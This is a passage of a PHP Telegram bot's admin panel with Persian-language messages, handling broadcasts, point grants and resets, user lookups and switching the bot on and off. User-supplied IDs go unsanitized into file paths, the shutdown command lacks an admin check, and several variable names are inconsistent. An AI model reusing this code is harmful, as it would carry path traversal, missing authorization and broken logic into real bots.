$user_b = file_get_contents("data/$from_id/bots.txt");
$member_b = explode("\n",$user_b);
if (!in_array($un,$member_b)){
$add_bot = file_get_contents("data/$from_id/bots.txt");
$add_bot .= $un."\n";
file_put_contents("data/$from_id/bots.txt",$add_bot);
}
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
ربات خریدار ساخته شد ✅
",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>" 🤖 @$un",'url'=>"https://t.me/$un"]],
]
])
]);
$coin = file_get_contents("data/$from_id/coin.txt");
settype($coin,"integer");
$newcoin = $coin - 0;
save("data/$from_id/coin.txt",$newcoin);
}
}
//======================
elseif($text1 == "📊" && $chat_id == $Dev){
$user = file_get_contents("users.txt");
$member_id = explode("\n",$user);
$member_count = count($member_id) -1;
sendmessage($chat_id , "
🎲آمار:
 $member_count
" , "html");
}
elseif($text1 == "پیام همگانی✏" && $chat_id == $Dev){
file_put_contents("data/$from_id/step.txt","pm");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"لطفا پیام خود را ارسال کنید ✔️",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'keyboard'=>[

[['text'=>"🔚"]],
],
'resize_keyboard'=>true
])
]);
}
elseif($step == "pm" && $text !="🔚" ){
file_put_contents("data/$from_id/step.txt","none");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"پیام شما با موفقیت به تمام اعضا ارسال شد❗️",
]);
$all_member = fopen( "users.txt", "r");
while( !feof( $all_member)){
$user = fgets( $all_member);
SendMessage($user,$text1,"html");
}
}
elseif($text1 == "🎁 الماس همگانی" && $chat_id == $Dev){
file_put_contents("data/$from_id/step.txt","coin to all");
        bot('sendmessage', [
                'chat_id' =>$chat_id,
                'text' =>"😋 مدیر لطفا مقدار الماس را وارد کن :",
				'reply_to_message_id' => $message_id,
               'parse_mode'=>'HTML',
			       'reply_markup'=>json_encode([
      'keyboard'=>[
	  [['text'=>'🔚']],
      ],'resize_keyboard'=>true])
	]);
}

elseif($bot == "coin to all"){
if(preg_match('/^([0-9])/',$text)){
file_put_contents("data/$from_id/wait.txt",$text);
file_put_contents("data/$from_id/step.txt","coin to all 2");
        bot('sendmessage', [
                'chat_id' =>$chat_id,
                'text' =>"⁉️ آیا ارسال $text الماس به تمام کاربران ربات را تایید میکنید ؟

بله یا خیر؟",
				'reply_to_message_id' => $message_id,
               'parse_mode'=>'HTML',
			       'reply_markup'=>json_encode([
      'keyboard'=>[
	  [['text'=>'🔚']],
	  [['text'=>"خیر"],['text'=>"بله"]],
      ],'resize_keyboard'=>true])
	]);
}else{
        bot('sendmessage', [
                'chat_id' =>$chat_id,
                'text' =>"⚠️ ورودی نامعتبر است !
👈🏻 لطفا فقط عدد ارسال کنید :",
				'reply_to_message_id' => $message_id,
               'parse_mode'=>'HTML',
			       'reply_markup'=>json_encode([
      'keyboard'=>[
	  [['text'=>'🔚']],
      ],'resize_keyboard'=>true])
	]);
}
}
elseif($bot == "coin to all 2"){
if($text == "خیر"){
unlink("data/$from_id/wait.txt");
file_put_contents("data/$from_id/step.txt",'none');
        bot('sendmessage', [
                'chat_id' =>$chat_id,
                'text' =>"✅ با موفقیت لغو شد !",
				'reply_to_message_id' => $message_id,
               'parse_mode'=>'HTML',
        	'reply_markup'=>json_encode([
      'keyboard'=>[
	  [['text'=>'🔚']],
      ],'resize_keyboard'=>true])
	]);
}
elseif($text == "بله"){
$Member = explode("\n",$list);
$count = count($Member)-2;
file_put_contents("data/$from_id/step.txt",'none');
for($z = 0;$z <= $count;$z++){
$user = $Member[$z];
if($user != "\n" && $user != " "){
	$id = json_decode(file_get_contents("https://api.telegram.org/bot".API_KEY."/getChat?chat_id=".$user));
	$user2 = $id->result->id;
if($user2 != null){
$coin = file_get_contents("data/$user/coin.txt");
file_put_contents("data/$user/coin.txt",$coin + $wait);
        bot('sendmessage', [
                'chat_id' =>$user,
                'text' =>"
🔻خبر خوش
➖شما از طرف مدیریت ربات $wite امتیاز گرفتید.

🆑 @ShahreSource
",
               'parse_mode'=>'html'
	]);
}
}
}
unlink("data/$from_id/wait.txt");
        bot('sendmessage', [
                'chat_id' =>$chat_id,
                'text' =>"✅ با موفقیت به تمام اعضا مقدار $wait الماس ارسال شد !",
				'reply_to_message_id' => $message_id,
               'parse_mode'=>'HTML',
        	'reply_markup'=>json_encode([
      'keyboard'=>[
	  [['text'=>'🔚']],
      ],'resize_keyboard'=>true])
	]);
}else{
        bot('sendmessage', [
                'chat_id' =>$chat_id,
                'text' =>"💢 لطفا فقط از کیبورد زیر انتخاب کنید :",
				'reply_to_message_id' => $message_id,
               'parse_mode'=>'HTML',
			       'reply_markup'=>json_encode([
      'keyboard'=>[
	  [['text'=>'🔚']],
	  [['text'=>"خیر"],['text'=>"بله"]],
      ],'resize_keyboard'=>true])
	]);
}
}
elseif($text1 == "امتیاز به کاربر ⭐️" && $from_id == $Dev){
file_put_contents("data/$from_id/step.txt","fromidforcoin");
bot('sendmessage',[
'chat_id' => $Dev,
'text' =>"🍇ایدی عددی کاربر را وارد کنید:",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"🔚"]],
],
'resize_keyboard'=>true,
])
]);
}
elseif($step == "fromidforcoin" && $text !="🔚" ){
file_put_contents("data/$from_id/step.txt","tedadecoin4set");
$text = $message->text;
file_put_contents("data/$from_id/to.txt",$text);
$coin1 = file_get_contents("data/$text/coin.txt");
bot('sendmessage', [
'chat_id' => $Dev,
'text' =>"
این فرد $coin1 امتیاز دارد
چه مقدار امتیاز  اضافه کنم؟
",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'keyboard'=>[

[['text'=>"🔚"]],
],
'resize_keyboard'=>true
])
]);
}
elseif($step == "tedadecoin4set"){
file_put_contents("data/$from_id/step.txt","none");
$text = $message->text;
$coin = file_get_contents("data/$to/coin.txt");
settype($coin,"integer");
$newcoin = $coin + $text;
file_put_contents("data/$to/coin.txt",$newcoin);
$cooin = $coin + $text;
bot('sendmessage', [
'chat_id' => $Dev,
'text' =>"به فرد $text سکه اضافه شد و سکه های او تا الان $cooin میباشد!",
]);
bot('sendmessage',[
'chat_id' => $to,
'text' =>"مقدار $text امتیاز به شما افزوده شد 🍒",
]);
}
elseif($text1 == "اطلاعات کاربر 👤" && $chat_id == $Dev){
file_put_contents("data/$from_id/step.txt","informatin");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"ایدی عددی شخص را ارسال کنید.",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'keyboard'=>[

[['text'=>"🔚"]],
],
'resize_keyboard'=>true
])
]);
}
elseif($step == "informatin" && $text !="🔚" ){
file_put_contents("data/$from_id/step.txt","$text");
$zirs = file_get_contents('data/'.$text."/membrs.txt");
$hesab = file_get_contents('data/'.$text."/type.txt");
$coin = file_get_contents('data/'.$text."/coin.txt");
$phone = file_get_contents('data/'.$text."/bots.txt");
$txtt = file_get_contents("data/$text/mems.txt");
$member_id = explode("\n",$txtt);
$mm1 = count($member_id)-1;
unset($member_id[$mm1]);
foreach($member_id as $id => $value){
$new .= "[$value](tg://user?id=$value)\n";
}
SendMessage($chat_id,"
نوع حساب کاربر: $hesab 
پیوی کاربر: [$text](tg://user?id=$text) 
موجودی کاربر : $coin
زیرمجوعه های شخص :$zirs
ربات های شخص : $phone
 ","MarkDown","true");
}

elseif($text1 == "حذف امتیاز کاربر 😤" && $chat_id == $Dev){
file_put_contents("data/$from_id/step.txt","em0");
bot('Sendmessage',[
'chat_id'=>$chat_id,
'text'=>"👩‍💻 لطفا آیدی عددی کاربری که میخواهید تعداد امتیازات او را 0 را ارسال کنید :",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'keyboard'=>[

[['text'=>"🔚"]],
],
'resize_keyboard'=>true
])
]);
}
elseif($step == "em0" && $text !="🔚" ){
$aaddd = file_get_contents("data/$text/coin.txt");
file_put_contents("data/$text/coin.txt","0");
bot('Sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
🔪 امتیاز های او صفر شد
",
]);
bot('Sendmessage',[
'chat_id'=>$text,
'text'=>"🔥امتیازات شما به دلیل آوردن زیرمجموعه فیک حذف شدند!",
]);
file_put_contents("data/$from_id/step.txt","none");
}
elseif($text1 == "روشن کردن ربات🔔"&& $from_id == $Dev){
file_put_contents("data/onof.txt","on");
 bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"ربات هم اکنون در دسترس قرار گرفت ✅",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'keyboard'=>[

[['text'=>"🔚"]],
],
'resize_keyboard'=>true
])
]);
}
elseif($text1 == "خاموش کردن ربات🔕"){
file_put_contents("data/onof.txt","off");
 bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"رباتبا موفقیت از دسترس کاربران خارج شد🚫",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'keyboard'=>[

[['text'=>"🔚"]],
],
'resize_keyboard'=>true
])
]);
}

unlink('error_log');
?>